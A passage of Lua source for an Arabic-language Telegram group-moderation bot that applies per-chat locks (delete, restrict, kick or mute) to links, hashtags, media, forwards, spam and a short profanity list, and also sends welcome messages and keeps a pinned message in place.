if hash or Dev_Bots(msg) or DeveloperBot1(msg) or DeveloperBot(msg) or PresidentGroup(msg) or Bot(msg) then       
return true    
else    
return false    
end 
end
function Owner(msg)
local hash = redis:sismember(bot_id..'Tshakex:Manager:Group'..msg.chat_id_,msg.sender_user_id_)    
if hash or Dev_Bots(msg) or DeveloperBot1(msg) or DeveloperBot(msg) or PresidentGroup(msg) or Constructor(msg) or Bot(msg) then       
return true    
else    
return false    
end 
end
function Admin(msg)
local hash = redis:sismember(bot_id..'Tshakex:Admin:Group'..msg.chat_id_,msg.sender_user_id_)    
if hash or Dev_Bots(msg) or DeveloperBot1(msg) or DeveloperBot(msg) or PresidentGroup(msg) or Constructor(msg) or Owner(msg) or Bot(msg) then       
return true    
else    
return false    
end 
end
function Vips(msg)
local hash = redis:sismember(bot_id..'Tshakex:Vip:Group'..msg.chat_id_,msg.sender_user_id_) 
if hash or Dev_Bots(msg) or DeveloperBot1(msg) or DeveloperBot(msg) or PresidentGroup(msg) or Constructor(msg) or Owner(msg) or Admin(msg) or Bot(msg) then       
return true 
else 
return false 
end 
end
------------------------------------------------------------------------------------------------------------
if msg.chat_id_ then
local id = tostring(msg.chat_id_)
if id:match("-100(%d+)") then
redis:incr(bot_id..'Tshakex:Num:Message:User'..msg.chat_id_..':'..msg.sender_user_id_) 
TypeForChat = 'ForSuppur' 
elseif id:match("^(%d+)") then
redis:sadd(bot_id..'Tshakex:Num:User:Pv',msg.sender_user_id_)  
TypeForChat = 'ForUser' 
else
TypeForChat = 'ForGroup' 
end
end
------------------------------------------------------------------------------------------------------------
if redis:get(bot_id.."Tshakex:Lock:text"..msg.chat_id_) and not Vips(msg) then       
Delete_Message(msg.chat_id_,{[0] = msg.id_})   
return false     
end     
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == "MessageChatAddMembers" then 
redis:incr(bot_id.."Tshakex:Num:Add:Memp"..msg.chat_id_..":"..msg.sender_user_id_) 
end
if msg.content_.ID == "MessageChatAddMembers" and not Vips(msg) then   
if redis:get(bot_id.."Tshakex:Lock:AddMempar"..msg.chat_id_) == "kick" then
local mem_id = msg.content_.members_  
for i=0,#mem_id do  
KickGroup(msg.chat_id_,mem_id[i].id_)
end
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == "MessageChatJoinByLink" and not Vips(msg) then 
if redis:get(bot_id.."Tshakex:Lock:Join"..msg.chat_id_) == "kick" then
KickGroup(msg.chat_id_,msg.sender_user_id_)
return false  
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.caption_ then 
if msg.content_.caption_:match("@[%a%d_]+") or msg.content_.caption_:match("@(.+)") then  
if redis:get(bot_id.."Tshakex:Lock:User:Name"..msg.chat_id_) == "del" and not Vips(msg) then    
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Tshakex:Lock:User:Name"..msg.chat_id_) == "ked" and not Vips(msg) then    
RestrictChat(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Tshakex:Lock:User:Name"..msg.chat_id_) == "kick" and not Vips(msg) then    
KickGroup(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Tshakex:Lock:User:Name"..msg.chat_id_) == "ktm" and not Vips(msg) then    
redis:sadd(bot_id.."Tshakex:Silence:User:Group"..msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
end
end
end
--------------------------------------------------------------------------------------------------------------
if text and text:match("@[%a%d_]+") or text and text:match("@(.+)") then    
if redis:get(bot_id.."Tshakex:Lock:User:Name"..msg.chat_id_) == "del" and not Vips(msg) then    
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Tshakex:Lock:User:Name"..msg.chat_id_) == "ked" and not Vips(msg) then    
RestrictChat(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Tshakex:Lock:User:Name"..msg.chat_id_) == "kick" and not Vips(msg) then    
KickGroup(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Tshakex:Lock:User:Name"..msg.chat_id_) == "ktm" and not Vips(msg) then    
redis:sadd(bot_id.."Tshakex:Silence:User:Group"..msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.caption_ then 
if msg.content_.caption_:match("#[%a%d_]+") or msg.content_.caption_:match("#(.+)") then 
if redis:get(bot_id.."Tshakex:Lock:hashtak"..msg.chat_id_) == "del" and not Vips(msg) then    
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Tshakex:Lock:hashtak"..msg.chat_id_) == "ked" and not Vips(msg) then    
RestrictChat(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Tshakex:Lock:hashtak"..msg.chat_id_) == "kick" and not Vips(msg) then    
KickGroup(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Tshakex:Lock:hashtak"..msg.chat_id_) == "ktm" and not Vips(msg) then    
redis:sadd(bot_id.."Tshakex:Silence:User:Group"..msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
end
end
end
--------------------------------------------------------------------------------------------------------------
if text and text:match("#[%a%d_]+") or text and text:match("#(.+)") then
if redis:get(bot_id.."Tshakex:Lock:hashtak"..msg.chat_id_) == "del" and not Vips(msg) then    
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Tshakex:Lock:hashtak"..msg.chat_id_) == "ked" and not Vips(msg) then    
RestrictChat(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Tshakex:Lock:hashtak"..msg.chat_id_) == "kick" and not Vips(msg) then    
KickGroup(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Tshakex:Lock:hashtak"..msg.chat_id_) == "ktm" and not Vips(msg) then    
redis:sadd(bot_id.."Tshakex:Silence:User:Group"..msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.caption_ then 
if msg.content_.caption_:match("/[%a%d_]+") or msg.content_.caption_:match("/(.+)") then  
if redis:get(bot_id.."Tshakex:Lock:Cmd"..msg.chat_id_) == "del" and not Vips(msg) then    
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Tshakex:Lock:Cmd"..msg.chat_id_) == "ked" and not Vips(msg) then    
RestrictChat(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Tshakex:Lock:Cmd"..msg.chat_id_) == "kick" and not Vips(msg) then    
KickGroup(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Tshakex:Lock:Cmd"..msg.chat_id_) == "ktm" and not Vips(msg) then    
redis:sadd(bot_id.."Tshakex:Silence:User:Group"..msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
end
end
end
--------------------------------------------------------------------------------------------------------------
if text and text:match("/[%a%d_]+") or text and text:match("/(.+)") then
if redis:get(bot_id.."Tshakex:Lock:Cmd"..msg.chat_id_) == "del" and not Vips(msg) then    
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Tshakex:Lock:Cmd"..msg.chat_id_) == "ked" and not Vips(msg) then    
RestrictChat(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Tshakex:Lock:Cmd"..msg.chat_id_) == "kick" and not Vips(msg) then    
KickGroup(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Tshakex:Lock:Cmd"..msg.chat_id_) == "ktm" and not Vips(msg) then    
redis:sadd(bot_id.."Tshakex:Silence:User:Group"..msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.caption_ then 
if not Vips(msg) then 
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]/") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]/") or msg.content_.caption_:match(".[Pp][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]/") or msg.content_.caption_:match("[Jj][Oo][Ii][Nn][Cc][Hh][Aa][Tt]/") or msg.content_.caption_:match("[Tt].[Mm][Ee]/") then 
if redis:get(bot_id.."Tshakex:Lock:Link"..msg.chat_id_) == "del" and not Vips(msg) then
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Tshakex:Lock:Link"..msg.chat_id_) == "ked" and not Vips(msg) then
RestrictChat(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Tshakex:Lock:Link"..msg.chat_id_) == "kick" and not Vips(msg) then
KickGroup(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Tshakex:Lock:Link"..msg.chat_id_) == "ktm" and not Vips(msg) then
redis:sadd(bot_id.."Tshakex:Silence:User:Group"..msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
end
end
end
end
--------------------------------------------------------------------------------------------------------------
if text and text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]/") or text and text:match("[Hh][Tt][Tt][Pp][Ss]://") or text and text:match("[Hh][Tt][Tt][Pp]://") or text and text:match("[Ww][Ww][Ww].") or text and text:match(".[Cc][Oo][Mm]") or text and text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]/") or text and text:match(".[Pp][Ee]") or text and text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]/") or text and text:match("[Jj][Oo][Ii][Nn][Cc][Hh][Aa][Tt]/") or text and text:match("[Tt].[Mm][Ee]/") and not Vips(msg) then
if redis:get(bot_id.."Tshakex:Lock:Link"..msg.chat_id_) == "del" and not Vips(msg) then
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Tshakex:Lock:Link"..msg.chat_id_) == "ked" and not Vips(msg) then 
RestrictChat(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Tshakex:Lock:Link"..msg.chat_id_) == "kick" and not Vips(msg) then
KickGroup(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Tshakex:Lock:Link"..msg.chat_id_) == "ktm" and not Vips(msg) then
redis:sadd(bot_id.."Tshakex:Silence:User:Group"..msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == "MessagePhoto" and not Vips(msg) then     
if redis:get(bot_id.."Tshakex:Lock:Photo"..msg.chat_id_) == "del" then
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Tshakex:Lock:Photo"..msg.chat_id_) == "ked" then
RestrictChat(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Tshakex:Lock:Photo"..msg.chat_id_) == "kick" then
KickGroup(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Tshakex:Lock:Photo"..msg.chat_id_) == "ktm" then
redis:sadd(bot_id.."Tshakex:Silence:User:Group"..msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == "MessageVideo" and not Vips(msg) then     
if redis:get(bot_id.."Tshakex:Lock:Video"..msg.chat_id_) == "del" then
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Tshakex:Lock:Video"..msg.chat_id_) == "ked" then
RestrictChat(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Tshakex:Lock:Video"..msg.chat_id_) == "kick" then
KickGroup(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Tshakex:Lock:Video"..msg.chat_id_) == "ktm" then
redis:sadd(bot_id.."Tshakex:Silence:User:Group"..msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == "MessageAnimation" and not Vips(msg) then     
if redis:get(bot_id.."Tshakex:Lock:Animation"..msg.chat_id_) == "del" then
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Tshakex:Lock:Animation"..msg.chat_id_) == "ked" then
RestrictChat(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Tshakex:Lock:Animation"..msg.chat_id_) == "kick" then
KickGroup(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Tshakex:Lock:Animation"..msg.chat_id_) == "ktm" then
redis:sadd(bot_id.."Tshakex:Silence:User:Group"..msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.game_ and not Vips(msg) then     
if redis:get(bot_id.."Tshakex:Lock:geam"..msg.chat_id_) == "del" then
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Tshakex:Lock:geam"..msg.chat_id_) == "ked" then
RestrictChat(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Tshakex:Lock:geam"..msg.chat_id_) == "kick" then
KickGroup(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Tshakex:Lock:geam"..msg.chat_id_) == "ktm" then
redis:sadd(bot_id.."Tshakex:Silence:User:Group"..msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == "MessageAudio" and not Vips(msg) then     
if redis:get(bot_id.."Tshakex:Lock:Audio"..msg.chat_id_) == "del" then
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Tshakex:Lock:Audio"..msg.chat_id_) == "ked" then
RestrictChat(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Tshakex:Lock:Audio"..msg.chat_id_) == "kick" then
KickGroup(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Tshakex:Lock:Audio"..msg.chat_id_) == "ktm" then
redis:sadd(bot_id.."Tshakex:Silence:User:Group"..msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == "MessageVoice" and not Vips(msg) then     
if redis:get(bot_id.."Tshakex:Lock:vico"..msg.chat_id_) == "del" then
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Tshakex:Lock:vico"..msg.chat_id_) == "ked" then
RestrictChat(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Tshakex:Lock:vico"..msg.chat_id_) == "kick" then
KickGroup(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Tshakex:Lock:vico"..msg.chat_id_) == "ktm" then
redis:sadd(bot_id.."Tshakex:Silence:User:Group"..msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.reply_markup_ and msg.reply_markup_.ID == "ReplyMarkupInlineKeyboard" and not Vips(msg) then     
if redis:get(bot_id.."Tshakex:Lock:Keyboard"..msg.chat_id_) == "del" then
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Tshakex:Lock:Keyboard"..msg.chat_id_) == "ked" then
RestrictChat(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Tshakex:Lock:Keyboard"..msg.chat_id_) == "kick" then
KickGroup(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Tshakex:Lock:Keyboard"..msg.chat_id_) == "ktm" then
redis:sadd(bot_id.."Tshakex:Silence:User:Group"..msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == "MessageSticker" and not Vips(msg) then     
if redis:get(bot_id.."Tshakex:Lock:Sticker"..msg.chat_id_) == "del" then
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Tshakex:Lock:Sticker"..msg.chat_id_) == "ked" then
RestrictChat(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Tshakex:Lock:Sticker"..msg.chat_id_) == "kick" then
KickGroup(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Tshakex:Lock:Sticker"..msg.chat_id_) == "ktm" then
redis:sadd(bot_id.."Tshakex:Silence:User:Group"..msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.forward_info_ and not Vips(msg) then     
if redis:get(bot_id.."Tshakex:Lock:forward"..msg.chat_id_) == "del" then
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
return false
elseif redis:get(bot_id.."Tshakex:Lock:forward"..msg.chat_id_) == "ked" then
RestrictChat(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
return false
elseif redis:get(bot_id.."Tshakex:Lock:forward"..msg.chat_id_) == "kick" then
KickGroup(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
return false
elseif redis:get(bot_id.."Tshakex:Lock:forward"..msg.chat_id_) == "ktm" then
redis:sadd(bot_id.."Tshakex:Silence:User:Group"..msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
return false
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == "MessageDocument" and not Vips(msg) then     
if redis:get(bot_id.."Tshakex:Lock:Document"..msg.chat_id_) == "del" then
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Tshakex:Lock:Document"..msg.chat_id_) == "ked" then
RestrictChat(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Tshakex:Lock:Document"..msg.chat_id_) == "kick" then
KickGroup(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Tshakex:Lock:Document"..msg.chat_id_) == "ktm" then
redis:sadd(bot_id.."Tshakex:Silence:User:Group"..msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == "MessageUnsupported" and not Vips(msg) then      
if redis:get(bot_id.."Tshakex:Lock:Unsupported"..msg.chat_id_) == "del" then
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Tshakex:Lock:Unsupported"..msg.chat_id_) == "ked" then
RestrictChat(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Tshakex:Lock:Unsupported"..msg.chat_id_) == "kick" then
KickGroup(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Tshakex:Lock:Unsupported"..msg.chat_id_) == "ktm" then
redis:sadd(bot_id.."Tshakex:Silence:User:Group"..msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.entities_ then 
if msg.content_.entities_[0] then 
if msg.content_.entities_[0] and msg.content_.entities_[0].ID == "MessageEntityUrl" or msg.content_.entities_[0].ID == "MessageEntityTextUrl" then      
if not Vips(msg) then
if redis:get(bot_id.."Tshakex:Lock:Markdaun"..msg.chat_id_) == "del" then
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Tshakex:Lock:Markdaun"..msg.chat_id_) == "ked" then
RestrictChat(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Tshakex:Lock:Markdaun"..msg.chat_id_) == "kick" then
KickGroup(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Tshakex:Lock:Markdaun"..msg.chat_id_) == "ktm" then
redis:sadd(bot_id.."Tshakex:Silence:User:Group"..msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
end
end  
end 
end
end 

if tonumber(msg.via_bot_user_id_) ~= 0 and not Vips(msg) then
if redis:get(bot_id.."Tshakex:Lock:Inlen"..msg.chat_id_) == "del" then
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Tshakex:Lock:Inlen"..msg.chat_id_) == "ked" then
RestrictChat(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Tshakex:Lock:Inlen"..msg.chat_id_) == "kick" then
KickGroup(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Tshakex:Lock:Inlen"..msg.chat_id_) == "ktm" then
redis:sadd(bot_id.."Tshakex:Silence:User:Group"..msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
end
end 
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == "MessageContact" and not Vips(msg) then      
if redis:get(bot_id.."Tshakex:Lock:Contact"..msg.chat_id_) == "del" then
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Tshakex:Lock:Contact"..msg.chat_id_) == "ked" then
RestrictChat(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Tshakex:Lock:Contact"..msg.chat_id_) == "kick" then
KickGroup(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Tshakex:Lock:Contact"..msg.chat_id_) == "ktm" then
redis:sadd(bot_id.."Tshakex:Silence:User:Group"..msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.text_ and not Vips(msg) then  
local _nl, ctrl_ = string.gsub(text, "%c", "")  
local _nl, real_ = string.gsub(text, "%d", "")   
sens = 400  
if redis:get(bot_id.."Tshakex:Lock:Spam"..msg.chat_id_) == "del" and string.len(msg.content_.text_) > (sens) or ctrl_ > (sens) or real_ > (sens) then 
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Tshakex:Lock:Spam"..msg.chat_id_) == "ked" and string.len(msg.content_.text_) > (sens) or ctrl_ > (sens) or real_ > (sens) then 
RestrictChat(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Tshakex:Lock:Spam"..msg.chat_id_) == "kick" and string.len(msg.content_.text_) > (sens) or ctrl_ > (sens) or real_ > (sens) then 
KickGroup(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Tshakex:Lock:Spam"..msg.chat_id_) == "ktm" and string.len(msg.content_.text_) > (sens) or ctrl_ > (sens) or real_ > (sens) then 
redis:sadd(bot_id.."Tshakex:Silence:User:Group"..msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
end
end
------------------------------------------------------------------------------------------------------
local status_welcome = redis:get(bot_id.."Tshakex:Chek:Welcome"..msg.chat_id_)
if status_welcome and not redis:get(bot_id.."Tshakex:Lock:tagservr"..msg.chat_id_) then
if msg.content_.ID == "MessageChatJoinByLink" or msg.content_.ID == "MessageChatAddMembers" then
tdcli_function({ID = "GetUser",user_id_=msg.sender_user_id_},function(extra,result) 
local GetWelcomeGroup = redis:get(bot_id.."Tshakex:Get:Welcome:Group"..msg.chat_id_)  
if GetWelcomeGroup then 
t = GetWelcomeGroup
else  
t = '\n• نورت \n name \n user' 
end 
t = t:gsub('name',result.first_name_) 
if result.username_ then 
welcomeuser = '[@'..result.username_..']'
else
welcomeuser = ' لا يوجد معرف'
end
t = t:gsub('user',welcomeuser) 
send(msg.chat_id_, msg.id_,t)
end,nil) 
end 
end 
if text and redis:get(bot_id..'lock:Fshar'..msg.chat_id_) and not Admin(msg) then 
list = {"خول","كسمك","كسختك","عير","كسخالتك","خرا بالله","عير بالله","كسخواتكم","كحاب","مناويج","مناويج","كحبه","ابن الكحبه","فرخ","فروخ","طيزك","طيزختك"}
for k,v in pairs(list) do
print(string.find(text,v))
if string.find(text,v) ~= nil then
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
return false
end
end
end
if text and redis:get(bot_id..'lock:emoje'..msg.chat_id_) and not Admin(msg) then 
list = {"😀","😃","😄","😁","😆","😅","😂 ","🤣","☺️","😊","😇","🙂","🙃","😉","😌","😍","🥰","😘","😗","😙","😚","😋","😛","😝","😜","😜","🤪","🤨","🧐","🤓","😎","🤩","🥳","😏","","😞","😔","😟","😕","🙁","☹️","😣","😖","😫","🥺","😢","😭","","😠","😡","🤬","🤯","😳","🥵","🥶","😱","😨","😰","😥","😓","🤗","🤔","🤭","🤫","🤥","😶","😐","😑","😬","🙄","😯","😦","😧","😮","😲","🥱","😴","🤤","😪","🤤","😵","🤠","🤑","🤕","🤒","😷","🤮","😷","🤢","🥴"}
for k,v in pairs(list) do
print(string.find(text,v))
if string.find(text,v) ~= nil then
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
return false
end
end
end
-------------------------------------------------------
if msg.content_.ID == "MessagePinMessage" then
if Constructor(msg) or tonumber(msg.sender_user_id_) == tonumber(bot_id) then 
redis:set(bot_id.."Tshakex:Get:Id:Msg:Pin"..msg.chat_id_,msg.content_.message_id_)
else
local Msg_Pin = redis:get(bot_id.."Tshakex:Get:Id:Msg:Pin"..msg.chat_id_)
if Msg_Pin and redis:get(bot_id.."Tshakex:lockpin"..msg.chat_id_) then
Pin_Message(msg.chat_id_,Msg_Pin)
end
end
end
--------------------------------------------------------------------------------------------------------------
if not Vips(msg) and msg.content_.ID ~= "MessageChatAddMembers" and redis:hget(bot_id.."Tshakex:Spam:Group:User"..msg.chat_id_,"Spam:User") then 
if msg.sender_user_id_ ~= bot_id then
floods = redis:hget(bot_id.."Tshakex:Spam:Group:User"..msg.chat_id_,"Spam:User") or "nil"
Num_Msg_Max = redis:hget(bot_id.."Tshakex:Spam:Group:User"..msg.chat_id_,"Num:Spam") or 5
Time_Spam = redis:hget(bot_id.."Tshakex:Spam:Group:User"..msg.chat_id_,"Num:Spam:Time") or 5
local post_count = tonumber(redis:get(bot_id.."Tshakex:Spam:Cont"..msg.sender_user_id_..":"..msg.chat_id_) or 0)
if post_count > tonumber(redis:hget(bot_id.."Tshakex:Spam:Group:User"..msg.chat_id_,"Num:Spam") or 5) then 
local ch = msg.chat_id_
